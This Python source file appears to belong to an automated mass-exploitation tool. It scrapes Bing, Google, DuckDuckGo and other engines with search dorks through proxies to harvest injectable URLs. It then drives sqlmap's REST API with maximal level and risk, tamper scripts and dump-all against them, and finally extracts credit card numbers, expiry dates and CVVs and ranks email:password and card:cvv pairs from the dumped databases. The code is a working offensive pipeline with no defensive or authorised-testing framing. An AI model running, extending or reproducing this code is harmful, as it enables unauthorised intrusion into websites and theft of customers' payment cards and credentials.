        # Primary: result divs with class "yuRUbf" contain real result links
        for div in soup.find_all("div", class_="yuRUbf"):
            a = div.find("a", href=True)
            if a:
                href = _fix_href(a["href"].strip(), "google.com")
                if href.startswith("http") and is_valid_url(href):
                    urls.append(href.rstrip("/"))
        # Secondary: <a> tags with class "l" or inside h3
        if not urls:
            for h3 in soup.find_all("h3"):
                a = h3.find_parent("a", href=True)
                if a:
                    href = _fix_href(a["href"].strip(), "google.com")
                    if href.startswith("http") and is_valid_url(href):
                        urls.append(href.rstrip("/"))
        # Fallback: all <a> with /url?q= pattern
        if not urls:
            for a in soup.find_all("a", href=True):
                href = a["href"]
                if href.startswith("/url?q="):
                    try:
                        href = unquote(href.split("/url?q=")[1].split("&")[0])
                    except Exception:
                        continue
                href = _fix_href(href.strip(), "google.com")
                if href.startswith("http") and is_valid_url(href):
                    urls.append(href.rstrip("/"))
    except Exception:
        pass
    return list(dict.fromkeys(urls))


def extract_brave_urls(html: str) -> list:
    """Extract URLs from Brave Search results HTML."""
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        # Brave: result links inside .result-header or .snippet-url
        for a in soup.find_all("a", href=True):
            href = _fix_href(a["href"].strip(), "brave.com")
            if href.startswith("http") and is_valid_url(href):
                urls.append(href.rstrip("/"))
    except Exception:
        pass
    return list(dict.fromkeys(urls))


def extract_mojeek_urls(html: str) -> list:
    """Extract URLs from Mojeek search results HTML."""
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for li in soup.find_all("li", class_=re.compile(r"result")):
            a = li.find("a", href=True)
            if a:
                href = _fix_href(a["href"].strip(), "mojeek.com")
                if href.startswith("http") and is_valid_url(href):
                    urls.append(href.rstrip("/"))
        if not urls:
            for a in soup.find_all("a", href=True):
                href = _fix_href(a["href"].strip(), "mojeek.com")
                if href.startswith("http") and is_valid_url(href):
                    urls.append(href.rstrip("/"))
    except Exception:
        pass
    return list(dict.fromkeys(urls))


def extract_searx_urls(html: str) -> list:
    """Extract URLs from SearX/SearXNG results HTML."""
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        # SearXNG: result links have class "url_wrapper" or are inside article.result
        for article in soup.find_all("article", class_=re.compile(r"result")):
            a = article.find("a", href=True)
            if a:
                href = _fix_href(a["href"].strip(), "")
                if href.startswith("http") and is_valid_url(href):
                    urls.append(href.rstrip("/"))
        # Classic SearX: h3.result_header > a
        if not urls:
            for h3 in soup.find_all("h3", class_=re.compile(r"result")):
                a = h3.find("a", href=True)
                if a:
                    href = _fix_href(a["href"].strip(), "")
                    if href.startswith("http") and is_valid_url(href):
                        urls.append(href.rstrip("/"))
        # JSON API fallback: SearXNG can serve JSON
        if not urls:
            # Try to find any JSON embedded result URLs
            for a in soup.find_all("a", href=True):
                href = a["href"].strip()
                if href.startswith("http") and is_valid_url(href):
                    from urllib.parse import urlparse as _up
                    host = _up(href).netloc.lower()
                    # Skip SearX instance URLs
                    if not any(x in host for x in ("searx", "searxng", "search.")):
                        urls.append(href.rstrip("/"))
    except Exception:
        pass
    return list(dict.fromkeys(urls))


SCRAPE_ENGINES = [
    # ── Primary: Bing (works when not CAPTCHA'd — CAPTCHA auto-skipped) ────────
    {
        "name": "bing",
        "url": "https://www.bing.com/search?q={query}&first={offset}&count=30&setmkt=en-US&setlang=en",
        "extractor": extract_bing_urls,
        "offsets": [1, 11, 21, 31, 41, 51, 61, 71, 81, 91],
        "referer": "https://www.bing.com/",
        "weight": 5,
    },
    # ── Fallbacks: skipped automatically if CAPTCHA / 429 returned ────────────
    {
        "name": "google",
        "url": "https://www.google.com/search?q={query}&start={offset}&num=20&hl=en",
        "extractor": extract_google_urls,
        "offsets": [0, 10, 20, 30, 40, 50],
        "referer": "https://www.google.com/",
        "weight": 3,
    },
    {
        "name": "brave",
        "url": "https://search.brave.com/search?q={query}&offset={offset}&source=web",
        "extractor": extract_brave_urls,
        "offsets": [0, 10, 20, 30],
        "referer": "https://search.brave.com/",
        "weight": 2,
    },
    {
        "name": "ddg_lite",
        "url": "https://lite.duckduckgo.com/lite/?q={query}&s={offset}",
        "extractor": extract_ddg_urls,
        "offsets": [0, 20, 40, 60],
        "referer": "https://lite.duckduckgo.com/",
        "weight": 2,
    },
    {
        "name": "ddg_html",
        "url": "https://html.duckduckgo.com/html/?q={query}&s={offset}",
        "extractor": extract_ddg_urls,
        "offsets": [0, 30, 60, 90],
        "referer": "https://html.duckduckgo.com/",
        "weight": 2,
    },
    {
        "name": "yandex",
        "url": "https://yandex.com/search/?text={query}&p={offset}",
        "extractor": extract_yandex_urls,
        "offsets": [0, 1, 2, 3],
        "referer": "https://yandex.com/",
        "weight": 1,
    },
    {
        "name": "mojeek",
        "url": "https://www.mojeek.com/search?q={query}&s={offset}",
        "extractor": extract_mojeek_urls,
        "offsets": [1, 11, 21, 31],
        "referer": "https://www.mojeek.com/",
        "weight": 1,
    },
    {
        "name": "ask",
        "url": "https://www.ask.com/web?q={query}&o={offset}",
        "extractor": extract_ask_urls,
        "offsets": [1, 11, 21, 31],
        "referer": "https://www.ask.com/",
        "weight": 1,
    },
]

# Weighted engine pool (higher weight = picked more often in random.choice)
_ENGINE_POOL = [e for e in SCRAPE_ENGINES for _ in range(e.get("weight", 1))]


async def fetch_scrape(
    session: aiohttp.ClientSession,
    engine: dict,
    dork: str,
    offset: int,
    semaphore: asyncio.Semaphore,
    proxy_list: list = None,
) -> list:
    if proxy_list is None:
        proxy_list = []
    cleaned = clean_dork_for_search(dork)
    url = engine["url"].format(query=quote_plus(cleaned), offset=offset)
    headers = random.choice(HEADERS_LIST).copy()
    headers["Referer"] = engine.get("referer", "https://www.bing.com/")

    async with semaphore:
        for attempt in range(2):
            try:
                proxy_url = _pick_proxy(proxy_list)
                is_socks = proxy_url.startswith(("socks5://", "socks4://")) if proxy_url else False

                if is_socks and _SOCKS_AVAILABLE:
                    conn = _ProxyConnector.from_url(proxy_url, ssl=False)
                    async with aiohttp.ClientSession(connector=conn) as socks_sess:
                        async with socks_sess.get(
                            url,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=4, connect=2),
                            allow_redirects=True,
                        ) as resp:
                            if resp.status == 200:
                                html = await resp.text(errors="ignore")
                                if len(html) > 500 and not _is_captcha_page(html):
                                    return engine["extractor"](html)
                    return []

                kwargs = dict(
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=4, connect=2),
                    ssl=False,
                    allow_redirects=True,
                )
                if proxy_url and not is_socks:
                    kwargs["proxy"] = proxy_url
                async with session.get(url, **kwargs) as resp:
                    if resp.status == 200:
                        html = await resp.text(errors="ignore")
                        if len(html) > 500 and not _is_captcha_page(html):
                            return engine["extractor"](html)
                        return []
                    elif resp.status in (429, 403, 202):
                        return []
                    return []
            except asyncio.TimeoutError:
                pass
            except Exception:
                if attempt == 0:
                    await asyncio.sleep(0.05)
        return []


# ── MAIN SEARCH FUNCTION ──────────────────────────────────────────────────────

async def search_urls_from_dorks(
    dorks: list,
    limit: int = 100_000,
    progress_callback=None,
    stop_event: asyncio.Event = None,
    proxy_list: list = None,
) -> list:
    """
    Fast dual-engine URL search:
    1. DDGS (DuckDuckGo library) — primary, reliable, not blocked
    2. Bing + DDG HTML scraping — secondary, async, also fast

    No live-verification — search engines index only real live pages.
    Results sorted by quality: PHP pages with params first.
    """
    if proxy_list is None:
        proxy_list = []
    found_url_scores: dict = {}  # url ➪ quality score
    seen_normalized: set = set()
    domain_counts:   dict = {}  # domain ➪ count (diversity filter)
    total = len(dorks)
    retries = 0
    last_progress_time = 0.0
    MAX_PER_DOMAIN = 8   # max 8 URLs per domain — forces diversity across more sites

    # Scale DDGS variants based on total dork count to avoid rate-limit death:
    #   ≤ 500    ➪ 3 variants (max coverage)
    #   ≤ 5,000  ➪ 2 variants
    #   > 5,000  ➪ 1 variant  (500k dorks = max throughput, no waste)
    if total <= 500:
        _num_variants = 3
    elif total <= 5000:
        _num_variants = 2
    else:
        _num_variants = 1

    random.shuffle(dorks)

    def _add_url(url: str):
        """Thread-safe URL add with domain diversity filtering."""
        nonlocal found_url_scores, seen_normalized, domain_counts
        if len(found_url_scores) >= limit:
            return
        if not is_valid_url(url):
            return
        norm = normalize_url(url)
        if norm in seen_normalized:
            return
        # Domain diversity: max MAX_PER_DOMAIN URLs per domain
        try:
            domain = urlparse(url).netloc.lower().lstrip("www.")
            if domain_counts.get(domain, 0) >= MAX_PER_DOMAIN:
                return
            domain_counts[domain] = domain_counts.get(domain, 0) + 1
        except Exception:
            pass
        seen_normalized.add(norm)
        score = url_quality_score(url)
        found_url_scores[url.rstrip("/")] = score

    async def _report(done: int):
        nonlocal last_progress_time
        now = time.monotonic()
        if now - last_progress_time < 1.5:
            return
        last_progress_time = now
        if progress_callback:
            try:
                await progress_callback(done, total, len(found_url_scores), retries)
            except Exception:
                pass

    # ── HTTP session for scraping — use shared connector ──────────────────────
    connector = _get_connector()   # shared pool (4000 sockets)
    scrape_sem = asyncio.Semaphore(1200)  # 1200 parallel HTTP scrapes (12 Cores / 62GB RAM)
    alt_engines = SCRAPE_ENGINES[1:] if len(SCRAPE_ENGINES) > 1 else _ENGINE_POOL

    async def _process_batch(batch_start: int, batch: list):
        """Beast-mode multi-engine batch: 2x Bing pages + 2x diverse engines + fast DDGS."""
        if (stop_event and stop_event.is_set()) or len(found_url_scores) >= limit:
            return

        bing_engine = SCRAPE_ENGINES[0]
        scrape_tasks = []
        for dork in batch:
            for offset in bing_engine["offsets"][:2]:
                scrape_tasks.append(
                    fetch_scrape(session, bing_engine, dork, offset, scrape_sem, proxy_list)
                )
            chosen_alts = random.sample(alt_engines, min(2, len(alt_engines)))
            for alt in chosen_alts:
                scrape_tasks.append(
                    fetch_scrape(session, alt, dork, random.choice(alt["offsets"][:2]), scrape_sem, proxy_list)
                )

        gather_args = [asyncio.gather(*scrape_tasks, return_exceptions=True)]
        if _ddgs_is_available():
            gather_args.append(
                asyncio.wait_for(
                    search_ddgs_batch(batch, max_results=50, proxy_list=proxy_list,
                                      num_variants=_num_variants),
                    timeout=3.0,
                )
            )

        all_results = await asyncio.gather(*gather_args, return_exceptions=True)

        scrape_res = all_results[0]
        if isinstance(scrape_res, list):
            for r in scrape_res:
                if isinstance(r, list):
                    for url in r:
                        _add_url(url)

        if len(all_results) > 1:
            ddgs_res = all_results[1]
            if isinstance(ddgs_res, list):
                for url in ddgs_res:
                    _add_url(url)

    async with aiohttp.ClientSession(connector=connector, connector_owner=False) as session:
        BATCH = 35
        batches = [dorks[i: i + BATCH] for i in range(0, total, BATCH)]
        queue = asyncio.Queue()
        for idx, b in enumerate(batches):
            queue.put_nowait((idx * BATCH, b))

        done_total = [0]

        async def _worker():
            while not queue.empty():
                if (stop_event and stop_event.is_set()) or len(found_url_scores) >= limit:
                    break
                try:
                    b_start, b_dorks = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                try:
                    await _process_batch(b_start, b_dorks)
                    done_total[0] = min(done_total[0] + len(b_dorks), total)
                    await _report(done_total[0])
                except Exception:
                    pass
                finally:
                    queue.task_done()

        num_workers = min(60, max(10, len(batches)))
        workers = [asyncio.create_task(_worker()) for _ in range(num_workers)]
        await asyncio.gather(*workers, return_exceptions=True)

    # ── Sort: best URLs first, fully unique ──────────────────────────────────
    sorted_items = sorted(found_url_scores.items(), key=lambda x: x[1], reverse=True)
    return list(dict.fromkeys(url for url, _ in sorted_items))


# ══════════════════════════════════════════════════════════════════════
#   SQLMAP REST API
# ══════════════════════════════════════════════════════════════════════


# ── sqlmapapi binary/script ────────────────────────────────────────────────────
_SQLMAP_PKG_DIR = None
try:
    import importlib.util
    spec = importlib.util.find_spec("sqlmap")
    if spec and spec.submodule_search_locations:
        _SQLMAP_PKG_DIR = list(spec.submodule_search_locations)[0]
except Exception:
    pass

SQLMAPAPI_SCRIPT = None
if _SQLMAP_PKG_DIR:
    _candidate = os.path.join(_SQLMAP_PKG_DIR, "sqlmapapi.py")
    if os.path.isfile(_candidate):
        SQLMAPAPI_SCRIPT = _candidate

SQLMAPAPI_BIN = shutil.which("sqlmapapi")

# ── API server config ─────────────────────────────────────────────────────────
API_HOST = "127.0.0.1"
API_PORT = 8775
API_BASE = f"http://{API_HOST}:{API_PORT}"
API_TIMEOUT = aiohttp.ClientTimeout(total=10)

# ── Server process handle ─────────────────────────────────────────────────────
_server_proc: Optional[subprocess.Popen] = None
_server_lock = asyncio.Lock()
_server_ready = False

# ── Defaults — loaded from config.py ──────────────────────────────────────────
try:
    from config import (
        DEFAULT_LEVEL, DEFAULT_RISK, DEFAULT_TECHNIQUE,
        DEFAULT_TAMPER, DEFAULT_THREADS, DEFAULT_TIMEOUT, DEFAULT_MAX_CONC,
    )
except ImportError:
    DEFAULT_LEVEL      = 5
    DEFAULT_RISK       = 3
    DEFAULT_TECHNIQUE  = "BEUSTQ"
    DEFAULT_THREADS    = 10
    DEFAULT_TAMPER     = "space2comment,between,charencode"
    DEFAULT_TIMEOUT    = 420
    DEFAULT_MAX_CONC   = 5

# ══════════════════════════════════════════════════════════════════════════════
#  DOCTOR SQL — Keyword Matching + Severity Classification
# ══════════════════════════════════════════════════════════════════════════════

SEVERITY_CRITICAL = "🔴 ᴄʀɪᴛɪᴄᴀʟ"
SEVERITY_HIGH     = "🟠 ʜɪɢʜ"
SEVERITY_MEDIUM   = "🟡 ᴍᴇᴅɪᴜᴍ"
SEVERITY_LOW      = "🟢 ʟᴏᴡ"
SEVERITY_INFO     = "⚪ ɪɴғᴏ"

# Sensitive column keyword categories (Doctor SQL style)
SENSITIVE_KEYWORDS = {
    "credit_card": [
        "card_number", "cardnumber", "card_num", "cc_number", "ccnumber",
        "credit_card", "creditcard", "card", "cc", "pan", "card_data",
        "card_info", "payment_card", "debit_card", "card_no",
    ],
    "cvv": [
        "cvv", "cvc", "cvv2", "cvc2", "security_code", "card_code",
        "verification_code", "cvn",
    ],
    "expiry": [
        "expiry", "expiry_date", "exp_date", "expiration", "card_expiry",
        "card_exp", "expiry_month", "expiry_year", "exp_month", "exp_year",
    ],
    "password": [
        "password", "passwd", "pwd", "pass", "password_hash", "hash",
        "encrypted_password", "hashed_password", "user_pass", "pass_hash",
        "password_md5", "password_sha", "user_password", "account_password",
    ],
    "email": [
        "email", "email_address", "mail", "user_email", "member_email",
        "account_email", "contact_email", "primary_email",
    ],
    "username": [
        "username", "user_name", "login", "userid", "user_id", "login_name",
        "account_name", "member_name", "handle", "nickname",
    ],
    "ssn": [
        "ssn", "social_security", "social_security_number", "sin",
        "national_id", "national_number", "id_number", "personal_id",
    ],
    "phone": [
        "phone", "phone_number", "mobile", "mobile_number", "cell",
        "telephone", "tel", "contact_number", "phone_no",
    ],
    "address": [
        "address", "billing_address", "shipping_address", "street",
        "street_address", "home_address",
    ],
    "token": [
        "token", "auth_token", "access_token", "refresh_token",
        "api_key", "secret_key", "private_key", "session_token",
    ],
}

# Auto-dump column pairs (Doctor SQL style — what to look for together)
AUTO_DUMP_PAIRS = [
    ("email",    "password",  "email:pass"),
    ("email",    "passwd",    "email:pass"),
    ("username", "password",  "user:pass"),
    ("user",     "password",  "user:pass"),
    ("login",    "password",  "login:pass"),
    ("login",    "passwd",    "login:pass"),
    ("username", "passwd",    "user:pass"),
    ("user",     "pass",      "user:pass"),
    ("email",    "pwd",       "email:pwd"),
    ("username", "pwd",       "user:pwd"),
    ("card_number", "cvv",   "card:cvv"),
    ("cc",       "cvv",      "cc:cvv"),
    ("username", "token",    "user:token"),
    ("email",    "token",    "email:token"),
]


def keyword_match_columns(tables: list) -> dict:
    """
    Doctor SQL-style keyword matching.
    Returns {category: [(table, column), ...]} for each sensitive category found.
    """
    matches = {cat: [] for cat in SENSITIVE_KEYWORDS}
    for tbl in tables:
        tname = tbl.get("table", "") if isinstance(tbl, dict) else str(tbl)
        cols  = tbl.get("columns", []) if isinstance(tbl, dict) else []
        for col in cols:
            col_lower = str(col).lower()
            for category, keywords in SENSITIVE_KEYWORDS.items():
                for kw in keywords:
                    if kw in col_lower:
                        matches[category].append((tname, col))
                        break
    return {k: v for k, v in matches.items() if v}


def detect_auto_pairs(tables: list) -> list:
    """
    Detect high-value column pairs across tables (e-mail+password etc.).
    Returns list of (table, col1, col2, pair_name) tuples.
    """
    found_pairs = []
    for tbl in tables:
        tname = tbl.get("table", "") if isinstance(tbl, dict) else str(tbl)
        cols  = [str(c).lower() for c in (tbl.get("columns", []) if isinstance(tbl, dict) else [])]
        for kw1, kw2, pair_name in AUTO_DUMP_PAIRS:
            has1 = any(kw1 in c for c in cols)
            has2 = any(kw2 in c for c in cols)
            if has1 and has2:
                c1 = next((c for c in cols if kw1 in c), kw1)
                c2 = next((c for c in cols if kw2 in c), kw2)
                found_pairs.append((tname, c1, c2, pair_name))
    return found_pairs


def classify_severity(keyword_matches: dict, cards: list) -> str:
    """
    Doctor SQL-style severity classification:
      CRITICAL  — CC + CVV found, or CC + expiry
      HIGH      — email+password combo found, or SSN or raw CC
      MEDIUM    — email or username+password
      LOW       — only phone/address
      INFO      — no sensitive data
    """
    cats = set(keyword_matches.keys())

    if cards:
        return SEVERITY_CRITICAL
    if "credit_card" in cats and ("cvv" in cats or "expiry" in cats):
        return SEVERITY_CRITICAL
    if "credit_card" in cats:
        return SEVERITY_HIGH
    if "ssn" in cats:
        return SEVERITY_HIGH
    if "token" in cats and ("email" in cats or "username" in cats):
        return SEVERITY_HIGH
    if "email" in cats and "password" in cats:
        return SEVERITY_HIGH
    if "username" in cats and "password" in cats:
        return SEVERITY_HIGH
    if "email" in cats or "password" in cats or "username" in cats:
        return SEVERITY_MEDIUM
    if "phone" in cats or "address" in cats:
        return SEVERITY_LOW
    return SEVERITY_INFO


# ── CC patterns ───────────────────────────────────────────────────────────────
_CARD_RE = re.compile(
    r"\b(4[0-9]{12}(?:[0-9]{3,6})?"
    r"|5[1-5][0-9]{14}"
    r"|2(?:2[2-9][1-9]|[3-6]\d{2}|7(?:[01]\d|20))\d{12}"
    r"|3[47][0-9]{13}"
    r"|6(?:011|5[0-9]{2})[0-9]{12}"
    r"|(?:2131|1800|35\d{3})\d{11})\b"
)
_EXP_RE  = re.compile(r"\b(0?[1-9]|1[0-2])[/\-|,](2[0-9]|20[0-9]{2})\b")
_CVV_RE  = re.compile(r"\b([0-9]{3,4})\b")


# ══════════════════════════════════════════════════════════════════════════════
#  SERVER MANAGEMENT
# ══════════════════════════════════════════════════════════════════════════════

async def _check_server() -> bool:
    """Return True if sqlmapapi server is already responding."""
    try:
        async with aiohttp.ClientSession(timeout=API_TIMEOUT) as sess:
            async with sess.get(f"{API_BASE}/version") as r:
                return r.status == 200
    except Exception:
        return False


async def ensure_api_server() -> bool:
    """Start sqlmapapi server if not running. Returns True on success."""
    global _server_proc, _server_ready

    async with _server_lock:
        if _server_ready and await _check_server():
            return True

        if await _check_server():
            _server_ready = True
            return True

        # Find the script/binary to run
        launch_cmd = None
        if SQLMAPAPI_BIN:
            launch_cmd = [SQLMAPAPI_BIN, "-s", "-H", API_HOST, "-p", str(API_PORT)]
        elif SQLMAPAPI_SCRIPT:
            launch_cmd = [sys.executable, SQLMAPAPI_SCRIPT, "-s", "-H", API_HOST, "-p", str(API_PORT)]
        else:
            logger.error("sqlmapapi not found — REST API unavailable")
            return False

        logger.info(f"Starting sqlmapapi server: {' '.join(launch_cmd)}")
        try:
            _server_proc = subprocess.Popen(
                launch_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                env={**os.environ, "PYTHONUNBUFFERED": "1"},
            )
        except Exception as e:
            logger.error(f"Failed to start sqlmapapi: {e}")
            return False

        for attempt in range(20):
            await asyncio.sleep(1)
            if await _check_server():
                _server_ready = True
                logger.info(f"sqlmapapi server ready on {API_BASE}")
                return True

        logger.error("sqlmapapi server did not become ready in 20s")
        return False


def stop_api_server():
    """Kill the API server process (cleanup)."""
    global _server_proc, _server_ready
    if _server_proc:
        try:
            _server_proc.terminate()
        except Exception:
            pass
        _server_proc = None
    _server_ready = False


# ══════════════════════════════════════════════════════════════════════════════
#  LOW-LEVEL REST HELPERS
# ══════════════════════════════════════════════════════════════════════════════

async def _get(session: aiohttp.ClientSession, path: str) -> dict:
    async with session.get(f"{API_BASE}{path}", timeout=API_TIMEOUT) as r:
        return await r.json()


async def _post(session: aiohttp.ClientSession, path: str, data: dict) -> dict:
    async with session.post(f"{API_BASE}{path}", json=data, timeout=API_TIMEOUT) as r:
        return await r.json()


# ══════════════════════════════════════════════════════════════════════════════
#  CC EXTRACTION
# ══════════════════════════════════════════════════════════════════════════════

def _extract_cards_from_text(text: str) -> list:
    cards, seen = [], set()
    for m in _CARD_RE.finditer(text):
        card_num = m.group(1)
        # Search ±100 chars around card number for expiry
        ctx = text[max(0, m.start()-60):m.start()+120]
        exp_m    = _EXP_RE.search(ctx)
        month, year = ("??", "??")
        if exp_m:
            month = exp_m.group(1).zfill(2)
            year  = exp_m.group(2)[-2:]
        cvv = "???"
        # Search short window after card number for CVV
        # Fix: don't use `c in card_num` (always True for short strings in long number)
        # Instead: skip only if c equals the last 3-4 digits of card (common false positive)
        card_tail3 = card_num[-3:]
        card_tail4 = card_num[-4:]
        cvv_ctx = text[m.end():m.end()+80]  # look AFTER the card number for CVV
        for c in _CVV_RE.findall(cvv_ctx):
            if c == year or c == ("20" + year):
                continue
            if c == card_tail3 or c == card_tail4:
                continue
            if len(c) in (3, 4):
                cvv = c
                break
        entry = f"{card_num}|{month}|{year}|{cvv}"
        if entry not in seen:
            seen.add(entry)
            cards.append(entry)
    return cards


def _extract_cards_from_api_data(data_list: list) -> list:
    """Parse CC numbers from sqlmap API /scan/{taskid}/data response."""
    cards, seen = [], set()
    for item in data_list:
        # type 2 = dump data
        val = item.get("value", "")
        text = json.dumps(val) if not isinstance(val, str) else val
        for c in _extract_cards_from_text(text):
            if c not in seen:
                seen.add(c)
                cards.append(c)
    return cards


def _extract_cards_from_csv_dir(output_dir: str) -> list:
    """Walk sqlmap output dir, parse CC from CSV files."""
    cards, seen = [], set()
    for root, _, files in os.walk(output_dir):
        for fname in files:
            if not fname.lower().endswith(".csv"):
                continue
            try:
                with open(os.path.join(root, fname), encoding="utf-8", errors="ignore") as f:
                    for row in csv.reader(f):
                        row_str = " ".join(str(c) for c in row)
                        for c in _extract_cards_from_text(row_str):
                            if c not in seen:
                                seen.add(c)
                                cards.append(c)
            except Exception:
                pass
    return cards


# ══════════════════════════════════════════════════════════════════════════════
#  BUILD OPTIONS DICT  (maps to sqlmapapi option/{taskid}/set)
# ══════════════════════════════════════════════════════════════════════════════

def build_options(
    url: str = None,
    *,
    level: int       = DEFAULT_LEVEL,
    risk: int        = DEFAULT_RISK,
    technique: str   = DEFAULT_TECHNIQUE,
    threads: int     = DEFAULT_THREADS,
    tamper: str      = DEFAULT_TAMPER,
    proxy: str       = None,
    proxy_file: str  = None,
    forms: bool      = True,
    dump_all: bool   = True,
    random_agent: bool = True,
    crawl_depth: int = 0,
    google_dork: str = None,
    bulk_file: str   = None,
    get_banner: bool = True,
    get_current_user: bool = True,
    get_current_db: bool   = True,
    get_dbs: bool    = True,
    is_dba: bool     = True,
    batch: bool      = True,
    flush_session: bool = True,
    skip_waf: bool   = True,
    timeout: int     = 10,
    retries: int     = 2,
    verbose: int     = 0,
) -> dict:
    """Build the options dict for /option/{taskid}/set."""
    opts: Dict = {
        "level":          level,
        "risk":           risk,
        "technique":      technique,
        "threads":        threads,
        "tamper":         tamper,
        "forms":          forms,
        "dumpAll":        dump_all,
        "randomAgent":    random_agent,
        "batch":          batch,
        "flushSession":   flush_session,
        "timeout":        timeout,
        "retries":        retries,
        "verbose":        verbose,
        "getBanner":      get_banner,
        "getCurrentUser": get_current_user,
        "getCurrentDb":   get_current_db,
        "getDbs":         get_dbs,
        "isDba":          is_dba,
    }
    if url:
        opts["url"] = url
    if proxy:
        opts["proxy"] = proxy
    if proxy_file and os.path.isfile(proxy_file):
        opts["proxyFile"] = proxy_file
    if google_dork:
        opts["googleDork"] = google_dork
        opts.pop("url", None)
    if bulk_file and os.path.isfile(bulk_file):
        opts["bulkFile"] = bulk_file
        opts.pop("url", None)
    if crawl_depth and crawl_depth > 0:
        opts["crawlDepth"] = crawl_depth
    return opts


# ══════════════════════════════════════════════════════════════════════════════
#  SINGLE TASK: create ➪ set opts ➪ start ➪ poll ➪ extract
# ══════════════════════════════════════════════════════════════════════════════

class ApiTaskResult:
    __slots__ = ("url", "taskid", "success", "cards", "tables",
                 "banner", "current_user", "current_db", "dbs",
                 "log_lines", "error", "csv_dir",
                 "severity", "keyword_matches", "auto_pairs", "dbms")
    def __init__(self, url=""):
        self.url              = url
        self.taskid           = ""
        self.success          = False
        self.cards:     list  = []
        self.tables:    list  = []
        self.banner           = ""
        self.current_user     = ""
        self.current_db       = ""
        self.dbs:       list  = []
        self.log_lines: list  = []
        self.error            = ""
        self.csv_dir          = ""
        # Doctor SQL extras
        self.severity         = SEVERITY_INFO
        self.keyword_matches: dict = {}
        self.auto_pairs:      list = []
        self.dbms             = ""


async def run_api_task(
    options: dict,
    *,
    task_timeout: int    = DEFAULT_TIMEOUT,
    log_cb: Optional[Callable[[str], None]] = None,
    stop_event: Optional[asyncio.Event]     = None,
    csv_output_dir: str  = "",
) -> ApiTaskResult:
    """
    Full lifecycle: new task ➪ set options ➪ start ➪ poll ➪ data ➪ delete.
    log_cb(line) is called with every new sqlmap log line (for live updates).
    """
    result = ApiTaskResult(url=options.get("url", options.get("googleDork", options.get("bulkFile", ""))))

    if not await ensure_api_server():
        result.error = "sqlmapapi server unavailable"
        return result

    async with aiohttp.ClientSession() as sess:
        # 1. Create task
        try:
            resp = await _get(sess, "/task/new")
            if not resp.get("success"):
                result.error = "failed to create task"
                return result
            taskid = resp["taskid"]
            result.taskid = taskid
        except Exception as e:
            result.error = f"task/new error: {e}"
            return result

        # 2. Set options (include output-dir if given)
        if csv_output_dir:
            options = {**options, "oDir": csv_output_dir}
        try:
            await _post(sess, f"/option/{taskid}/set", options)
        except Exception as e:
            result.error = f"option/set error: {e}"
            return result

        # 3. Start scan
        try:
            start_data = {}
            if "url" in options:
                start_data["url"] = options["url"]
            start_resp = await _post(sess, f"/scan/{taskid}/start", start_data)
            if not start_resp.get("success"):
                result.error = f"scan/start failed: {start_resp}"
                await _get(sess, f"/task/{taskid}/delete")
                return result
        except Exception as e:
            result.error = f"scan/start error: {e}"
            return result

        # 4. Poll status + stream logs
        deadline    = time.time() + task_timeout
        seen_log_n  = 0
        status      = "running"

        while status in ("running", "not running"):
            if stop_event and stop_event.is_set():
                try:
                    await _get(sess, f"/scan/{taskid}/kill")
                except Exception:
                    pass
                result.error = "cancelled"
                break

            if time.time() > deadline:
                try:
                    await _get(sess, f"/scan/{taskid}/kill")
                except Exception:
                    pass
                result.error = "timeout"
                break

            await asyncio.sleep(4)

            # Stream new log lines
            try:
                log_resp = await _get(sess, f"/scan/{taskid}/log")
                log_entries = log_resp.get("log", [])
                new_entries = log_entries[seen_log_n:]
                seen_log_n  = len(log_entries)
                for entry in new_entries:
                    line = entry.get("message", "")
                    result.log_lines.append(line)
                    if log_cb and line:
                        try:
                            log_cb(line)
                        except Exception:
                            pass
            except Exception:
                pass

            # Check status
            try:
                st_resp = await _get(sess, f"/scan/{taskid}/status")
                status  = st_resp.get("status", "terminated")
            except Exception:
                break

        # 5. Collect data
        try:
            data_resp = await _get(sess, f"/scan/{taskid}/data")
            if data_resp.get("success") and data_resp.get("data"):
                raw_data = data_resp["data"]
                result.cards  = _extract_cards_from_api_data(raw_data)
                for item in raw_data:
                    itype = item.get("type", 0)
                    val   = item.get("value", {})
                    if itype == 2:            # dump
                        result.tables.append(val)
                    elif itype == 1:
                        _parse_fingerprint(item, result)
        except Exception:
            pass

        # 5b. Also scan sqlmap's real output directory for CSV files
        # sqlmap REST API writes CSVs to ~/.sqlmap/output/<domain>/ by default
        sqlmap_out_root = os.path.expanduser("~/.sqlmap/output")
        dirs_to_scan = []
        if csv_output_dir and os.path.isdir(csv_output_dir):
            dirs_to_scan.append(csv_output_dir)
        # Try to find domain-specific sqlmap output dir
        url_for_domain = options.get("url", "") or ""
        if url_for_domain:
            try:
                from urllib.parse import urlparse
                domain = urlparse(url_for_domain).netloc or ""
                if domain:
                    domain_dir = os.path.join(sqlmap_out_root, domain)
                    if os.path.isdir(domain_dir):
                        dirs_to_scan.append(domain_dir)
            except Exception:
                pass
        # Also scan entire ~/.sqlmap/output/ if accessible
        if os.path.isdir(sqlmap_out_root):
            dirs_to_scan.append(sqlmap_out_root)

        all_csv_cards: set = set(result.cards)
        for scan_dir in dirs_to_scan:
            for c in _extract_cards_from_csv_dir(scan_dir):
                all_csv_cards.add(c)
        result.cards = list(all_csv_cards)
        if dirs_to_scan:
            result.csv_dir = dirs_to_scan[0]

        result.success = bool(result.cards or result.tables)

        # 6. Also check log lines for key data + DBMS fingerprint
        full_log = "\n".join(result.log_lines)
        _parse_log_fingerprint(full_log, result)

        # Extract DBMS from banner / log (Doctor SQL style)
        for line in result.log_lines:
            ll = line.lower()
            if "the back-end dbms is" in ll:
                result.dbms = line.split("is")[-1].strip()
                break
            for dbms_name in ("mysql", "postgresql", "mssql", "oracle", "sqlite", "mariadb"):
                if dbms_name in ll and ("identified" in ll or "server version" in ll):
                    result.dbms = dbms_name.upper()
                    break

        # 6b. Doctor SQL: keyword matching + severity + auto-pairs
        if result.tables:
            result.keyword_matches = keyword_match_columns(result.tables)
            result.auto_pairs      = detect_auto_pairs(result.tables)
            result.severity        = classify_severity(result.keyword_matches, result.cards)
        elif result.cards:
            result.severity = SEVERITY_CRITICAL

        # 7. Cleanup
        try:
            await _get(sess, f"/task/{taskid}/delete")
        except Exception:
            pass

    return result


